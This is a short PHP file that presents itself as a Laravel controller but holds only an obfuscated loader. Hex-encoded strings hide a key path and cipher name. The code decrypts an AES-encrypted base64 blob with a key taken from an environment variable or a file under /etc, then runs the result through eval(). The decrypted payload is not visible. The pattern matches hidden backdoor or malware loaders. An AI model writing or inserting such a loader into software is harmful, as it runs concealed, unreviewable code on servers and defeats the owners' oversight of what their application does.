<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('gH1Aexgv/ApIAdZe6wLc4Q==');

$c=base64_decode(

'4qICNV2GpeBwkiyWtfFW1CLtaU4bjz/FiokJpGeib6t+jXx1BdjB9Ld60zicJQ3SRON6ldkT8MAh' .
'V7ApX6s/o6FH04oJ4UEmrJejOiBDDDF0KceyQ00wnH464S+B0Do1O9nMdDjmww+D1dAXUxfzAvVL' .
'vnudEAf+pBp/gJzR8EglkaV/AZMNqgHkHODRnBI9L+NpcsIvXOwSCR2YU8d7/Ng319gXQ3gAZ5DH' .
'qVu2nuqI6dSuwI4yjVWFTXUzIswTk3lTyvey4REQgsT5t0iyzh3ewrNKa98hO52pqSr7J0BHBKW8' .
'pPLEU9XdEmfCl/XPInA8D5JaL5LLBqyvI1BcGOBBD0v66KZMsIkIIfHLuTlCRPnhFFWSkNm7WFY6' .
'5wtlAzvL5owJOsRVdvP+PMPC1w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

